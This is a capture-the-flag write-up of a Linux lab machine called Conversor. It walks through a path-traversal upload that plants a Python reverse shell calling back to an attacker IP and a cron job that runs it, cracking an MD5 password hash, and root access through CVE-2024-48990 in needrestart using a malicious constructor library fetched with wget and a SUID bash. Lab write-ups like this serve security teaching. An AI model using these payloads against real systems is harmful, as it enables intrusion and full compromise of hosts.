---
layout: post
title: "Conversor"
date: 2025-12-15 00:00:00 -0400
author: Hugo Beaulieu
categories: linux machine
tags: linux path-traversal file-upload lxml md5-cracking cve-2024-48990 needrestart python-reverse-shell
---

## Overview

Conversor is a Linux machine running a web application that converts Nmap XML scan results using XSLT templates. The exploitation chain involves discovering a path traversal vulnerability in the file upload functionality, leveraging automatic cron-based Python script execution to gain initial access, cracking MD5 hashes to obtain SSH credentials, and exploiting CVE-2024-48990 in the needrestart utility to achieve root privileges.

## Initial Enumeration

### Nmap Scan

We start with a TCP nmap scan to identify open services:

```bash
nmap -sV -v conversor.htb
```

Results:

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-title: Login
|_Requested resource was /login
```

Two services are exposed:

- SSH on port 22 (OpenSSH 8.9p1)
- HTTP on port 80 (Apache 2.4.52)

### UDP Scan

We also perform a UDP scan for the top 1000 ports but find no additional services.

### Technology Stack

Using WhatWeb to fingerprint the application:

```bash
whatweb http://conversor.htb
```

Results:

```
[ Apache ]
  Version      : 2.4.52 (from HTTP Server Header)
  OS           : Ubuntu Linux

[ HTML5 ]
  HTML version 5, detected by the doctype declaration

[ Matomo ]
  Matomo is the leading open alternative to Google Analytics

[ RedirectLocation ]
  String       : /login (from location)
```

The application redirects to `/login` and uses Matomo analytics.

### Directory Enumeration

We scan directories using gobuster:

```bash
gobuster dir -u http://conversor.htb -w wordlist.txt
```

Discovered paths:

```
/javascript           (Status: 301) [Size: 319] [--> http://conversor.htb/javascript/]
/about                (Status: 200) [Size: 2842]
/login                (Status: 200) [Size: 722]
/register             (Status: 200) [Size: 726]
/logout               (Status: 302) [Size: 199] [--> /login]
/server-status        (Status: 403) [Size: 278]
/convert              (Status: 405) [Size: 153]
```

## Web Application Analysis

### Registration and Login

After creating an account at `/register` and logging in via `/login`, we're presented with a form that converts Nmap scan results from XML and XSLT formats to a more aesthetic HTML presentation using the `/convert` endpoint.

### XSLT Template Discovery

The application provides a downloadable XSLT template for formatting Nmap results:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" indent="yes" />

  <xsl:template match="/">
    <html>
      <head>
        <title>Nmap Scan Results</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(120deg, #141E30, #243B55);
            color: #eee;
            margin: 0;
            padding: 0;
          }
          /* ... additional styling ... */
        </style>
      </head>
      <body>
        <h1>Nmap Scan Report</h1>
        <h3><xsl:value-of select="nmaprun/@args"/></h3>

        <xsl:for-each select="nmaprun/host">
          <div class="card">
            <div class="host-header">
              Host: <span class="ip"><xsl:value-of select="address[@addrtype='ipv4']/@addr"/></span>
            </div>
            <table>
              <tr>
                <th>Port</th>
                <th>Protocol</th>
                <th>Service</th>
                <th>State</th>
              </tr>
              <xsl:for-each select="ports/port">
                <tr>
                  <td><xsl:value-of select="@portid"/></td>
                  <td><xsl:value-of select="@protocol"/></td>
                  <td><xsl:value-of select="service/@name"/></td>
                  <td>
                    <xsl:attribute name="class">
                      <xsl:value-of select="state/@state"/>
                    </xsl:attribute>
                    <xsl:value-of select="state/@state"/>
                  </td>
                </tr>
              </xsl:for-each>
            </table>
          </div>
        </xsl:for-each>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

This template processes Nmap XML output and renders it as formatted HTML with styling.

### Source Code Discovery

Visiting the `/about` page reveals a download button pointing to the application source code at `/static/source_code.tar.gz`.

### Extracting the Archive

Attempting to extract the archive with standard gzip arguments fails:

```bash
tar -xzf source_code.tar.gz
```

Error:

```
gzip: stdin: not in gzip format
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```

We identify the actual file type:

```bash
file source_code.tar.gz
```

Result:

```
source_code.tar.gz: POSIX tar archive (GNU)
```

Despite the `.tar.gz` extension, it's actually a plain `.tar` file. We extract it correctly:

```bash
tar -xf source_code.tar.gz
```

### Source Code Structure

The extracted source reveals the following structure:

```
├── app.py
├── app.wsgi
├── install.md
├── instance
│   └── users.db
├── scripts
├── static
│   ├── images
│   │   ├── arturo.png
│   │   ├── david.png
│   │   └── fismathack.png
│   ├── nmap.xslt
│   └── style.css
├── templates
│   ├── about.html
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   └── result.html
└── uploads
```

### Database Analysis

We examine the SQLite database using sqlite3:

```bash
sqlite3 instance/users.db
```

```sql
.tables
```

Result:

```
files  users
```

Both tables are empty, but this confirms the database structure for later exploitation.

### Critical Discovery: Cron-Based Script Execution

The `install.md` file contains a crucial deployment detail:

```markdown
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

- - - - - www-data for f in /var/www/conversor.htb/scripts/\*.py; do python3 "$f"; done
```

This reveals that:

- A cron job runs every minute
- It executes ALL Python files in `/var/www/conversor.htb/scripts/`
- Scripts run as the `www-data` user

### Path Traversal Vulnerability

Examining `app.py`, we discover a critical path traversal vulnerability in the file upload handling:

```python
xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)  # NO SANITIZATION!
xml_file.save(xml_path)
```

The application:

1. Takes the `xml_file.filename` parameter directly from user input
2. Performs NO validation or sanitization
3. Joins it with `UPLOAD_FOLDER` and saves the file

This allows us to control the save path using `../` sequences in the filename.

## Exploitation Chain

### Attack Strategy

We can chain together three vulnerabilities:

1. **Path Traversal** in the filename parameter (no input validation)
2. **Arbitrary File Write** to the `/scripts/` directory via `../scripts/`
3. **Cron-Based Code Execution** (automatic execution within 60 seconds)

### Creating the Payload

We prepare a Python reverse shell:

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("10.10.14.18",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

### Exploitation via Burp Suite

We intercept the POST request to `/convert` using Burp Suite and modify it:

```http
POST /convert HTTP/1.1
Host: conversor.htb
Content-Length: 717
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://conversor.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBcpfdqSJypzbnoIa
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://conversor.htb/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6InRlc3QifQ.aUCWmA.mEi8i52lyTs0e9GgP7xp3TBsBFI
Connection: keep-alive

------WebKitFormBoundaryBcpfdqSJypzbnoIa
Content-Disposition: form-data; name="xml_file"; filename="../scripts/shell.py"
Content-Type: text/plain

import socket,subprocess,os
s=socket.socket()
s.connect(("10.10.14.18",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
------WebKitFormBoundaryBcpfdqSJypzbnoIa
Content-Disposition: form-data; name="xslt_file"; filename="simple.xslt"
Content-Type: application/xslt+xml

<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <html><body>Test</body></html>
  </xsl:template>
</xsl:stylesheet>
------WebKitFormBoundaryBcpfdqSJypzbnoIa--
```

Key modifications:

- Changed `filename="nmap.xml"` to `filename="../scripts/shell.py"`
- Replaced XML content with Python reverse shell payload

### Getting a Shell

We start a netcat listener:

```bash
nc -lvnp 4444
```

After sending the malicious request, within 60 seconds the cron job executes our script:

```bash
listening on [any] 4444 ...
connect to [10.10.14.18] from (UNKNOWN) [10.129.37.71] 46828
bash: cannot set terminal process group (4457): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$
```

Success! We now have a shell as `www-data`.

## Lateral Movement to fismathack

### Database Enumeration

Now that we're on the system, we can examine the actual database:

```bash
sqlite3 /var/www/conversor.htb/instance/users.db
```

```sql
.tables
```

Result:

```
files  users
```

```sql
SELECT * FROM users;
```

Result:

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test|098f6bcd4621d373cade4e832627b4f6
```

We've discovered the `fismathack` user with an MD5 password hash.

### Hash Identification

We use name-that-hash to confirm the hash type:

```bash
nth -t 5b5c3ac3a1c897c94caad48e6c71fdec
```

Result:

```
Most Likely
MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.
MD4, HC: 900 JtR: raw-md4
NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.
Domain Cached Credentials, HC: 1100 JtR: mscach
```

### Hash Cracking

We crack the MD5 hash using hashcat:

```bash
echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4
```

Result:

```
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 5b5c3ac3a1c897c94caad48e6c71fdec
```

Credentials obtained: `fismathack:Keepmesafeandwarm`

### SSH Access

We connect via SSH with the recovered credentials:

```bash
ssh fismathack@conversor.htb
# Password: Keepmesafeandwarm
```

Success! We can now retrieve the user flag:

```bash
cat user.txt
```

Flag: `2936abb855d32318ec34fa57b304035b`

## Privilege Escalation to Root

### LinPEAS Enumeration

We run LinPEAS to enumerate privilege escalation vectors:

```bash
./linpeas.sh
```

Key finding:

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

The user `fismathack` can run `/usr/sbin/needrestart` as root without a password.

### needrestart Analysis

We check the version and help information:

```bash
/usr/sbin/needrestart --help
```

Output shows:

```
needrestart 3.7 - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]
```

Version 3.7 is vulnerable to **CVE-2024-48990**, which allows local privilege escalation through Python library hijacking.

### CVE-2024-48990 Exploitation

This vulnerability exploits the Python library search path mechanism. When `needrestart` runs as root, it imports Python modules. By creating a malicious shared library in a directory included in `PYTHONPATH`, we can inject code that executes with root privileges.

#### Creating the Malicious Library

On our attack machine, we compile a malicious shared library:

```bash
# Step 1: Create the malicious C code
cat << 'EOF' > /tmp/lib.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void pwn() __attribute__((constructor));

void pwn() {
    if(geteuid() == 0) {  // Only execute if we're root
        setuid(0);
        setgid(0);

        // Create SUID bash shell
        system("cp /bin/bash /tmp/rootbash");
        system("chmod u+s /tmp/rootbash");

        // Also create a flag file so we know it ran
        system("touch /tmp/pwned");
    }
}
EOF

# Step 2: Compile it
gcc -shared -fPIC -o __init__.so /tmp/lib.c

# Step 3: Verify it compiled correctly
file __init__.so
# Should show: ELF 64-bit LSB shared object, x86-64

# Step 4: Start a simple HTTP server to transfer
python3 -m http.server 8000
```

The `__attribute__((constructor))` ensures the `pwn()` function executes automatically when the shared library is loaded, before the main program runs.

#### Transferring and Setting Up

On the target machine:

```bash
# Create directory structure that mimics importlib
mkdir -p /tmp/malicious/importlib

# Download the malicious .so file
wget http://10.10.14.18:8000/__init__.so -O /tmp/malicious/importlib/__init__.so

# Verify the file transferred correctly
ls -la /tmp/malicious/importlib/__init__.so
file /tmp/malicious/importlib/__init__.so
# Should show: ELF 64-bit LSB shared object, x86-64

# Make it executable
chmod +x /tmp/malicious/importlib/__init__.so
```

#### Creating the Exploit Trigger

We create a Python script that keeps a process alive with our malicious library in its path:

```bash
cat << 'EOF' > /tmp/malicious/exploit.py
import time
import os

print("[*] Exploit running. Waiting for needrestart to be triggered...")
print("[*] In another terminal, run: sudo needrestart")

# Try to import importlib (this will fail but keeps process alive)
while True:
    try:
        import importlib
    except Exception as e:
        pass

    # Check if exploit succeeded
    if os.path.exists("/tmp/rootbash"):
        print("[+] SUCCESS! SUID shell created at /tmp/rootbash")
        print("[+] Run: /tmp/rootbash -p")
        break

    time.sleep(1)
EOF

# Start the exploit with our malicious PYTHONPATH
cd /tmp/malicious
PYTHONPATH=/tmp/malicious python3 exploit.py &

# Verify it's running
ps aux | grep exploit.py
```

#### Triggering the Exploit

In another terminal session on the target:

```bash
sudo needrestart
```

When `needrestart` runs as root, it attempts to import Python modules. Our `PYTHONPATH` manipulation causes it to load our malicious `__init__.so` from `/tmp/malicious/importlib/`, which executes the constructor function and creates a SUID bash shell.

#### Verifying Success

Check if the SUID shell was created:

```bash
ls -la /tmp/rootbash
# Should show: -rwsr-xr-x ... /tmp/rootbash

# Also check if the flag file exists
ls -la /tmp/pwned
```

#### Escalating to Root

Execute the SUID shell:

```bash
/tmp/rootbash -p
```

The `-p` flag preserves the SUID privileges. We verify root access:

```bash
whoami
# root
```

### Root Flag

Finally, we retrieve the root flag:

```bash
cat /root/root.txt
```

Flag: `4768ecc50ae5b7b36d84de17f56e24ac`

## Key Takeaways

- **Path traversal vulnerabilities** in file uploads can lead to arbitrary file write when combined with insufficient input validation
- **Cron jobs executing scripts** from predictable directories create opportunities for code execution if write access can be obtained
- **Source code exposure** through downloadable archives can reveal critical vulnerabilities and deployment details
- **MD5 hashing** remains easily crackable with modern tools and should not be used for password storage
- **Password reuse** across web applications and SSH is common in enterprise environments
- **Sudo privileges on system maintenance tools** like needrestart can be exploited for privilege escalation
- **CVE-2024-48990** demonstrates how Python library search path manipulation can compromise privileged processes
- **SUID shell creation** is an effective post-exploitation technique for maintaining privileged access
- **Constructor functions in shared libraries** execute automatically on load, making them ideal for privilege escalation payloads
- **Always check file extensions** against actual file types - misnamed archives can cause extraction issues
